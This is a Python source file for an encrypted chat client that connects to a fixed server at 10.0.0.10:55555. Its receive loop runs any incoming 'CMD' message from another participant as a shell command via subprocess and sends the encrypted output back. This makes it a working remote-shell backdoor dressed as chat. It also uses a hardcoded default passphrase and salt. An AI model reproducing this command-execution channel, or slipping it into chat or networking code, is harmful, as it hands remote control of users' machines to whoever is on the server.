import argparse
import socket
import threading
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
import os
import subprocess


# ///////////////////////////// FUNCTIONS ////////////////////////////////// #

def create_command(message):
    """
    This function takes a sent message and "parses?" the command out of the
    message.
    :param message: Received message, usually in form "Sender:" "CMD", commands
    :return: CMD commands in string format like dir, tree and so on.
    """
    command = message[2:]
    command = " ".join(command)
    return command


def encode_encrypt_encode(message):
    message = message.encode('UTF-8')
    message = my_encrypt(message)
    message = base64.b64encode(message)
    print(message)
    return message


def decode_decrypt_decode(message):
    base64_message = base64.b64decode(message)
    decrypted_message = my_decrypt(base64_message)
    UTF8_message = decrypted_message.decode('UTF-8')
    return UTF8_message


def output_from_command(message):
    splitted_message = message.split(" ")
    if splitted_message[1].upper() == "CMD" and \
            len(splitted_message) > 2 \
            and splitted_message[0] != nickname + ":":
        command = create_command(splitted_message)
        output = subprocess.getoutput(command)
        print("output suoraa subprocessista")
        print(output)
        print("-----------------------")
        return output
    else:
        return False


def receive():
    while True:
        try:
            # Try to receive a message from server, if NICK, send your nickname
            # Else, try to send your own message
            message = client.recv(1024)
            nicktest = message.decode('UTF-8')
            if nicktest == 'NICK':
                client.send(nickname.encode('UTF-8'))
                pass
            else:
                try:
                    decoded_message = decode_decrypt_decode(message)
                    # print(decoded_message)
                    if output_from_command(decoded_message):
                        output = output_from_command(decoded_message)
                        try:
                            output = encode_encrypt_encode(output)
                            client.send(output)
                        except:
                            print("Could not get output")
                    else:
                        print(decoded_message)
                except:
                    print("Could not decode and decrypt")
                    utf_message = message.decode('UTF-8')
                    print(utf_message)
        except:
            print("An error occured")
            client.close()
            break


def write():
    while True:
        message = f'{nickname}: {input("")}'
        # Encode the message to UTF-8 so it can be encrypted
        UTF8_message = message.encode('UTF-8')
        # Encrypt the message before base64 encoding.
        encrypted_msg = my_encrypt(UTF8_message)
        base64_message = base64.b64encode(encrypted_msg)
        client.send(base64_message)


def my_encrypt(plaintext):
    """
    This function encrypts the byte object.
    :param plaintext: The message you want to encrypt
    :return iv_and_ciphertext: The initiazation vector and ciphertext.
    """
    cipher = AES.new(enc_key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    iv_and_ciphertext = cipher.iv + ciphertext
    return iv_and_ciphertext


def my_decrypt(iv_and_ciphertext):
    """
    This function decrypts the crypted message
    :param iv_and_ciphertext: The initialization vector and ciphertext
    :return decrypted_text: Returns the decrypted text
    """
    # Take the initialization vector from the message
    iv = iv_and_ciphertext[:AES.block_size]
    # Create the decrypting cipher with the key and iv
    dec_cipher = AES.new(enc_key, AES.MODE_CBC, iv)
    # Take the initialization vector out from the message we want.
    ciphertext = iv_and_ciphertext[AES.block_size:]
    # At the end, decrypt just the message and return it.
    decrypted_text = unpad(dec_cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_text


# //////////////////////////// LOGIC /////////////////////////////////////// #


parser = argparse.ArgumentParser(description="Add a 16 char enryption key.")
# If the user adds --key and a string, it will be used as encryption key
parser.add_argument('--key', type=str, help="Enter a 16 char encryption key.")
parser.add_argument('--nick', type=str, help="Enter your nickname.")
args = parser.parse_args()

# Used for key salting
salt = b'<>N\x8e\xae\xf9\x16\xf9+\xf45\xf6I\x10\xc3\xae'

# If no encryption key was given, use the default one.
if args.key is None:
    enc_key = PBKDF2("Secretpassworded", salt, dkLen=16)
# Else, use the user given one and salt it.
else:
    enc_key = PBKDF2(args.key, salt, dkLen=16)


nickname = args.nick

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("10.0.0.10", 55555))

receive_thread = threading.Thread(target=receive)
receive_thread.start()

write_thread = threading.Thread(target=write)
write_thread.start()